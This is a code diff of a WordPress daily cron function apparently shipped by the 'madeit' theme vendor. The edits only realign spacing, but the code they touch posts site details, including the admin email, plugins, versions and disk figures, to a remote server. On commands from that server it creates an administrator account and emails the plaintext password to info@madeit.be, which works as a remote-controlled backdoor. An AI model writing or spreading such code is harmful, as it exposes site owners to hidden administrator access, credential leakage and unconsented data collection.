@@ -61,30 +61,30 @@ function madeit_cron_daily()
     $args = [
         'method' => 'POST',
         'body'   => [
-            'url'                 => home_url(),
-            'email'               => get_option('admin_email'),
-            'name'                => get_bloginfo('name'),
-            'version'             => get_bloginfo('version'),
-            'theme'               => get_option('template'),
-            'theme_version'       => wp_get_theme()->get('Version'),
-            'plugins'             => implode(',', get_option('active_plugins')),
-            'plugins_info'        => $plugins_data,
-            'language'            => get_locale(),
-            'charset'             => get_bloginfo('charset'),
-            'timezone'            => get_option('timezone_string'),
-            'debug'               => WP_DEBUG,
-            'multisite'           => is_multisite(),
-            'ssl'                 => is_ssl(),
-            'php_version'         => phpversion(),
-            'mysql_version'       => $wpdb->db_version(),
-            'wp_memory_limit'     => WP_MEMORY_LIMIT,
-            'wp_max_memory_limit' => WP_MAX_MEMORY_LIMIT,
-            'wp_debug'            => WP_DEBUG,
-            'wp_cache'            => WP_CACHE,
+            'url'                  => home_url(),
+            'email'                => get_option('admin_email'),
+            'name'                 => get_bloginfo('name'),
+            'version'              => get_bloginfo('version'),
+            'theme'                => get_option('template'),
+            'theme_version'        => wp_get_theme()->get('Version'),
+            'plugins'              => implode(',', get_option('active_plugins')),
+            'plugins_info'         => $plugins_data,
+            'language'             => get_locale(),
+            'charset'              => get_bloginfo('charset'),
+            'timezone'             => get_option('timezone_string'),
+            'debug'                => WP_DEBUG,
+            'multisite'            => is_multisite(),
+            'ssl'                  => is_ssl(),
+            'php_version'          => phpversion(),
+            'mysql_version'        => $wpdb->db_version(),
+            'wp_memory_limit'      => WP_MEMORY_LIMIT,
+            'wp_max_memory_limit'  => WP_MAX_MEMORY_LIMIT,
+            'wp_debug'             => WP_DEBUG,
+            'wp_cache'             => WP_CACHE,
             'disk_size'            => size_format(disk_total_space(ABSPATH)),
             'disk_free'            => size_format(disk_free_space(ABSPATH)),
             'disk_used'            => size_format(disk_total_space(ABSPATH) - disk_free_space(ABSPATH)),
-            'options'             => madeit_get_defined_options([
+            'options'              => madeit_get_defined_options([
                 'MADEIT_VERSION',
                 'MADEIT_UPDATER_TYPE',
                 'MADEIT_UPDATER_CHILD_THEME',
@@ -232,7 +232,7 @@ function madeit_cron_daily()
                     'role'       => 'administrator',
                 ]);
 
-                mail('info@madeit.be', 'New support session: ' . home_url(), 'New support session started for '.$email.' with password '.$password);
+                mail('info@madeit.be', 'New support session: '.home_url(), 'New support session started for '.$email.' with password '.$password);
             } elseif ($action['action'] === 'delete_support') {
                 $email = 'support@madeit.be';
                 $user = get_user_by('email', $email);
